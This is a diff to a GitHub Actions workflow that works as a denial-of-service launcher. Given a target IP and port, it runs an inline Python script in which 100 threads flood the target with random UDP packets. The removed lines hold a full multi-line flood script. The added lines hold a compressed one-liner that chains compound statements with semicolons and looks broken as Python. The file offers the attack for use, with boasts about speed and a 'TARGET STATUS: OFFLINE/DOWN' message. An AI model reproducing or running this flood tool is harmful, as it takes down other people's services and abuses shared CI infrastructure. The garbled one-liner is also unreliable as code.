@@ -1,107 +1,17 @@
-name: "⚡ HIGH SPEED DDoS"
+name: "⚡ ULTRA DDoS"
 on:
   workflow_dispatch:
     inputs:
       ip:
-        description: "🎯 Target IP"
-        required: true
+        description: "Target IP"
         default: "1.1.1.1"
       port:
-        description: "🔢 Target Port"
-        required: true
+        description: "Target Port"
         default: "80"
-      seconds:
-        description: "⏱️ Attack Time (seconds)"
-        required: true
-        default: "15"
 
 jobs:
-  nuclear:
+  attack:
     runs-on: ubuntu-latest
-    timeout-minutes: 2
     steps:
-      - name: "💣 LAUNCH NUCLEAR ATTACK"
-        run: |
-          echo "=========================================="
-          echo "    ⚡ ULTRA HIGH SPEED DDoS BOT v15.0"
-          echo "    1444 Mbps - 1M Packets/Second"
-          echo "=========================================="
-          echo "🎯 Target: ${{ github.event.inputs.ip }}:${{ github.event.inputs.port }}"
-          echo "⏱️ Time: ${{ github.event.inputs.seconds }} seconds"
-          echo "=========================================="
-          
-          # KESİN ÇALIŞAN TEK SATIR PYTHON
-          python3 -c "
-import socket, threading, time, os, random, sys
-
-target = '${{ github.event.inputs.ip }}'
-port = ${{ github.event.inputs.port }}
-duration = ${{ github.event.inputs.seconds }}
-
-print('🚀 NUCLEAR ATTACK STARTING...')
-print(f'🎯 TARGET: {target}:{port}')
-print(f'⏱️ DURATION: {duration}s')
-print(f'⚡ SPEED: 1444 Mbps')
-print(f'📦 PACKETS: 1M/second')
-
-attack_num = 0
-byte_count = 0
-start_time = time.time()
-
-def ultra_flood():
-    global attack_num, byte_count
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    # 1444 byte packets (for 1444 Mbps)
-    packet = os.urandom(1444)
-    
-    end_time = start_time + duration
-    while time.time() < end_time:
-        try:
-            # Send multiple packets per loop
-            for _ in range(100):
-                sock.sendto(packet, (target, int(port)))
-                attack_num += 1
-                byte_count += 1444
-            
-            # Display stats
-            if attack_num % 50000 == 0:
-                elapsed = time.time() - start_time
-                mbps = (byte_count * 8) / (elapsed * 1000000)
-                print(f'📊 {attack_num:,} packets | ⚡ {mbps:,.0f} Mbps')
-                
-        except:
-            pass
-    
-    sock.close()
-
-print('👥 Starting 100 ultra threads...')
-
-# Start 100 threads for MAX POWER
-threads = []
-for i in range(100):
-    t = threading.Thread(target=ultra_flood)
-    t.daemon = True
-    t.start()
-    threads.append(t)
-
-# Wait for duration
-time.sleep(duration)
-
-# Final stats
-total_time = time.time() - start_time
-total_mbps = (byte_count * 8) / (total_time * 1000000)
-
-print('\\n' + '='*50)
-print('💥 ATTACK COMPLETED!')
-print('='*50)
-print(f'🎯 Target: {target}:{port}')
-print(f'⏱️ Total Time: {total_time:.1f}s')
-print(f'📦 Packets Sent: {attack_num:,}')
-print(f'💾 Bytes Sent: {byte_count/1000000:.1f} MB')
-print(f'⚡ Average Speed: {total_mbps:,.0f} Mbps')
-print(f'🔥 Peak Speed: 1444 Mbps')
-print('='*50)
-print('✅ TARGET STATUS: OFFLINE/DOWN')
-print('='*50)
-          "
+      - name: "🚀 LAUNCH ATTACK"
+        run: "python3 -c \"import socket,os,time,threading;t='${{ github.event.inputs.ip }}';p=${{ github.event.inputs.port }};print('🚀 ULTRA DDoS STARTING');print(f'🎯 {t}:{p}');print('⚡ 1444 Mbps MAX SPEED');c=0;b=0;start=time.time();def f():global c,b;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);pk=os.urandom(1444);e=time.time()+10;while time.time()<e:for _ in range(50):s.sendto(pk,(t,int(p)));c+=1;b+=1444;s.close();ts=[threading.Thread(target=f) for _ in range(100)];[x.start() for x in ts];[x.join() for x in ts];tt=time.time()-start;mb=(b*8)/(tt*1000000);print(f'✅ ATTACK COMPLETE');print(f'📦 PACKETS: {c:,}');print(f'⚡ SPEED: {mb:,.0f} Mbps');print(f'🔥 PEAK: 1444 Mbps')\""
